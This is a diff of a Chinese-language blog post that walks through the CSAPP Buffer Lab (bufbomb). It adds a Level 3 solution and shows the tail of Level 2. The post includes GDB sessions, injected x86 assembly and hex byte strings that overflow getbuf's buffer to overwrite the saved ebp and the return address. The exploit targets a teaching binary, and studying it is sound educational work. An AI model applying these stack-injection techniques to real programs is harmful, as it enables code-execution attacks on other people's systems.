@@ -18,7 +18,7 @@
 <meta property="og:site_name" content="一人Code">
 <meta property="og:description" content="csapp">
 <meta property="og:image" content="http://xinqiu.me/stack-frame-structure.png">
-<meta property="og:updated_time" content="2016-03-31T13:44:43.000Z">
+<meta property="og:updated_time" content="2016-04-06T10:48:32.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSAPP Lab3 解题分析">
 <meta name="twitter:description" content="csapp">
@@ -259,7 +259,7 @@
     <div class="post-content markdown" itemprop="articleBody">
         <div class="main-content-wrap">
             <p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
-<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_0"><span class="toc-text">Level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_2"><span class="toc-text">Level 2</span></a></li></ol>
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_0"><span class="toc-text">Level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_2"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_3"><span class="toc-text">Level 3</span></a></li></ol>
 <h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE <span class="number">32</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
@@ -303,6 +303,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x ($ebp-0x28)&#10;$1 = 0x55683168</span><br></pre></td></tr></table></figure>
 <p>现在可以构造文本文件level2.txt,首先前40个字节中先用level2.d左边的操作码填充，剩余空位用00填充，接着用4个00覆盖保存的%ebp地址，最后将恶意函数的入口地址覆盖原来的返回地址，通过ret执行这个恶意函数。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c7 05 00 d1 04 08 88 41 9d 21 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 31 68 55</span><br></pre></td></tr></table></figure>
+<h2 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h2><p>让getbuf正常返回到test函数，同时返回值为cookie。所以需要恢复被破坏的栈环境，将溢出前的正确的返回地址入栈，然后执行ret。因为getbuf的返回值在%eax寄存器中，溢出时会覆盖%ebp，所以需要进行恢复。</p>
+<p>使用GDB</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b test</span><br></pre></td></tr></table></figure>
+<p>接着</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r -u xinqiu</span><br></pre></td></tr></table></figure>
+<p>通过查看pc寄存器的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10i $pc&#10;=&#62; 0x8048dae &#60;test+4&#62;:  sub    $0x24,%esp&#10;   0x8048db1 &#60;test+7&#62;:  call   0x8048d90 &#60;uniqueval&#62;&#10;   0x8048db6 &#60;test+12&#62;: mov    %eax,-0xc(%ebp)&#10;   0x8048db9 &#60;test+15&#62;: call   0x80491f4 &#60;getbuf&#62;&#10;   0x8048dbe &#60;test+20&#62;: mov    %eax,%ebx&#10;   0x8048dc0 &#60;test+22&#62;: call   0x8048d90 &#60;uniqueval&#62;&#10;   0x8048dc5 &#60;test+27&#62;: mov    -0xc(%ebp),%edx&#10;   0x8048dc8 &#60;test+30&#62;: cmp    %edx,%eax&#10;   0x8048dca &#60;test+32&#62;: je     0x8048dda &#60;test+48&#62;&#10;   0x8048dcc &#60;test+34&#62;: movl   $0x804a388,(%esp)</span><br></pre></td></tr></table></figure>
+<p>可以知道在getbuf函数返回后的一条指令是 <code>0x8048dbe</code>。</p>
+<p>下面就是要构造攻击代码。需要将cookie传入eax寄存器，接着通过push入栈，ret返回来继续执行之后的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x219d4188,%eax&#10;push $0x08048dbe&#10;ret</span><br></pre></td></tr></table></figure>
+<p>类似Level 2的操作，可以得到攻击文本文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 88 41 9d 21 68 be 8d 04 08&#10;c3 00 00 00 00 00 00 00 00 00&#10;00 00 00 00 00 00 00 00 00 00 &#10;00 00 00 00 00 00 00 00 00 00&#10;c0 31 68 55&#10;68 31 68 55</span><br></pre></td></tr></table></figure>
+<p>其中，倒数第二行是保存的ebp寄存器地址。</p>
 
             
                 
